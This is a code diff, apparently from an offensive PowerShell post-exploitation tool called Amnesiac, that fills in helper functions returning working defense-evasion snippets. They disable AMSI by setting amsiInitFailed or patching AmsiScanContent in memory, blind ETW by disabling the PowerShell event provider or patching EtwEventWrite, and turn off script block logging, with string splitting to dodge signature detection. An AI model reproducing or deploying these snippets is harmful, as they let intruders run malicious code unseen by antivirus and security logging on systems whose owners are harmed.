@@ -10,9 +10,89 @@ $AmnesiacLoaderB64 = ""  # placeholder — populated by Build.ps1
 # for testing (dot-source Amnesiac.ps1, call helpers directly).
 # ============================================================
 
-function Get-AmsiBypassSnippet  { param([string]$Technique) throw "Not implemented" }
-function Get-EtwBypassSnippet   { param([string]$Technique) throw "Not implemented" }
-function Get-SblBypassSnippet   { throw "Not implemented" }
+function Get-AmsiBypassSnippet {
+    param([string]$Technique = 'pageguard')
+
+    switch ($Technique) {
+        'fail' {
+            return "[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.AmsiUt'+'ils').GetField('amsiIn'+'itFailed','NonPublic,Static').SetValue(`$null,`$true)"
+        }
+
+        'direct' {
+            $c = -join ((65..90 + 97..122) | Get-Random -Count 8 | % { [char]$_ })
+            return (
+                "`$_src = @'`n" +
+                "using System;`n" +
+                "using System.Runtime.InteropServices;`n" +
+                "public class $c {`n" +
+                "  [DllImport(""kernel32"")]public static extern bool VP(IntPtr a,uint b,uint c,out uint d);`n" +
+                "}`n" +
+                "'@;" +
+                "Add-Type -Td `$_src;" +
+                "`$_t=[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.AmsiUt'+'ils');" +
+                "`$_fp=`$_t.GetMethod('Sc'+'anContent','NonPublic,Static').MethodHandle.GetFunctionPointer();" +
+                "`$_o=[uint32]0;" +
+                "$c::VP(`$_fp,[uint32]6,[uint32]0x40,[ref]`$_o)|Out-Null;" +
+                "[Runtime.InteropServices.Marshal]::Copy([byte[]](0x48,0x31,0xC0,0xC3),0,`$_fp,4);" +
+                "$c::VP(`$_fp,[uint32]6,`$_o,[ref]`$_o)|Out-Null"
+            )
+        }
+
+        { $_ -in 'pageguard','hwbp' } {
+            # Full PAGE_GUARD+VEH or hardware-breakpoint technique requires AmnesiacLoader.Bypass (C#).
+            # PS payload uses 'fail' fallback; full technique activates via 'load loader' in session.
+            return Get-AmsiBypassSnippet -Technique 'fail'
+        }
+
+        default {
+            return Get-AmsiBypassSnippet -Technique 'fail'
+        }
+    }
+}
+
+function Get-EtwBypassSnippet {
+    param([string]$Technique = 'provider')
+
+    switch ($Technique) {
+        'provider' {
+            return "[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.Trac'+'ing.PSEtwLog'+'Provider').GetField('etwPro'+'vider','NonPublic,Static').GetValue(`$null)|%{[System.Diagnostics.Eventing.EventProvider].GetField('m_en'+'abled','NonPublic,Instance').SetValue(`$_,[Byte]0)}"
+        }
+
+        'patch' {
+            $c = -join ((65..90 + 97..122) | Get-Random -Count 8 | % { [char]$_ })
+            return (
+                "`$_es = @'`n" +
+                "using System;`n" +
+                "using System.Runtime.InteropServices;`n" +
+                "public class $c {`n" +
+                "  [DllImport(""kernel32"")]public static extern IntPtr GetModuleHandle(string m);`n" +
+                "  [DllImport(""kernel32"")]public static extern IntPtr GetProcAddress(IntPtr h,string p);`n" +
+                "  [DllImport(""kernel32"")]public static extern bool VP(IntPtr a,uint b,uint c,out uint d);`n" +
+                "}`n" +
+                "'@;" +
+                "Add-Type -Td `$_es;" +
+                "`$_h = $c::GetModuleHandle('ntdll');" +
+                "`$_p = $c::GetProcAddress(`$_h,'EtwEventWrite');" +
+                "`$_o=[uint32]0;" +
+                "$c::VP(`$_p,[uint32]6,[uint32]0x40,[ref]`$_o)|Out-Null;" +
+                "[Runtime.InteropServices.Marshal]::Copy([byte[]](0x48,0x33,0xC0,0xC3),0,`$_p,4);" +
+                "$c::VP(`$_p,[uint32]6,`$_o,[ref]`$_o)|Out-Null"
+            )
+        }
+
+        'thread' {
+            return Get-EtwBypassSnippet -Technique 'provider'
+        }
+
+        default {
+            return Get-EtwBypassSnippet -Technique 'provider'
+        }
+    }
+}
+
+function Get-SblBypassSnippet {
+    return "[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.Scri'+'ptBlock').GetField('checkScri'+'ptBlockLogg'+'ingCache','NonPublic,Static').SetValue(`$null,[Boolean]`$false)"
+}
 function New-PayloadScript      { param([switch]$IsServer,[string]$ComputerName,[string]$PipeName,[string]$SID,[hashtable]$Config) throw "Not implemented" }
 function Get-PayloadLauncher    { param([string]$Script,[string]$Launcher) throw "Not implemented" }
 function Initialize-DiskStructure {
